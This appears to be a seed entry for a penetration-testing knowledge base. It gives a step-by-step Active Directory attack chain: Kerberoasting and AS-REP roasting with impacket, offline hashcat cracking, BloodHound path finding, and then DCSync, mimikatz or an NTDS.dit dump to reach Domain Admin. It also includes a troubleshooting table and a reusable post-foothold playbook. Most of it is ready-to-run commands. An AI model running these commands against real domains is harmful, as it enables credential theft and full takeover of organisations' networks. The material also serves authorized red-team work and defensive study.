# [Seed] Kerberoasting → Offline Cracking → DA

## Scene classification
Penetration Testing/AD Attack

## Goal overview
There is a common domain user credential. There is a service account configured with SPN in the target domain. TGS is obtained through Kerberoasting for offline brute forcing. After cracking the clear text password, the BloodHound path is directly connected to the DA.

## Complete execution link

1. Based in the domain (any ordinary user, no local administrator required)
2. Enumerate SPNs
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. Check which accounts are assigned SPNs (usually SQL Server/IIS/custom service accounts)
4. Offline cracking
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Determine the password of a certain svc account → BloodHound to check the reachable path of this account
6. If the account is in Tier 0 group (Domain Admins / Server Operators / Backup Operators) → Direct DCSync
7. If it is not available but can RDP/WinRM on a certain key machine → go in and use mimikatz dump, chain to DA

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| GetUserSPNs returns nothing | The current user does not have read SPN permissions | Any ordinary domain user can; it may be that -dc-ip is wrong or PreAuth is not passed | 20min |
| Cracked for several hours to no avail | Password strength is high | 1) Change dictionary (rockyou.txt + corp keywords) 2) Use GPU (hashcat -d 1) 3) Try OneRuleToRuleThemAll rule set | Several hours |
| Failed to log in after getting the password | The credentials have expired or are case-sensitive | Verify with nxc first: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | GPO/ACL is missing during data collection | `bloodhound-python -c All` must bring All; the new version of BHCE recommends `--zip` | 30min |
| AS-REP Roasting did not find the target | There are few accounts with "Do not require Kerberos preauth" set | Use `GetNPUsers.py` to run alone: ​​` -usersfile users.txt -no-pass` | 15min |

## Toolchain discovery

- **impacket-GetUserSPNs** is already a de facto standard and is more cross-platform than PowerView.
- **netexec (nxc)** is the successor of CrackMapExec. It is fast and comes with spider_plus / lsassy / ntds and other modules.
- **BloodHound Community Edition (BHCE)** is the new version, much faster than the old BloodHound
- **OneRuleToRuleThemAll** rule set is the best for password brute forcing
- **bloodyAD** is a new generation AD tool that specializes in "low-privilege use of ACL to escalate privileges"

## Key code/command

Complete Kerberoasting process:

```bash
# 1. Verify credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP a dozen
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Offline blasting
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. Get the password and then use BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find the path: mark the svc account as Owned, see Shortest Path to DA
```

If the svc account can access SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Directly dump NTDS.dit
```

## Suggestions for improvements to this package

- `pentest-tools/references/network-attack-defense.md` should have the complete chapter on Kerberoasting
- BloodHound CE has become mainstream, bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Added `pentest-tools/references/ad-cheatsheet.md` to handle 6 major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) in one page

## Reusable patterns/script snippets

**Standard actions 30 minutes after establishing a foothold in the domain**:

```text
1. nxc smb verification credentials + automatic spider sharing
2. GetUserSPNs + GetNPUsers in one go
3. bloodhound-python -c All Collection
4. Simultaneous offline blasting (GPU running)
5. Wait and go through BloodHound to check Tier 0 / Pre-built attack paths
6. Break the password → Mark Owned → Recheck the path
```

**AD Kerberos hashcat mode quick check**:

| Mode | Purpose |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600 | NetNTLMv2 (caught by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## evolution action
- [ ] Add ad-cheatsheet.md
- [ ] tool-index Check nxc / bloodhound-ce / bloodyAD status
- [x] Routing matrix already includes Kerberos / Kerberoasting

## environmental information
- Kali 2026.x，impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: Any foothold in the domain (ordinary domain users)

## redaction requirements
This entry is seed data, written based on the public AD attack technology model, and does not involve the real target domain.
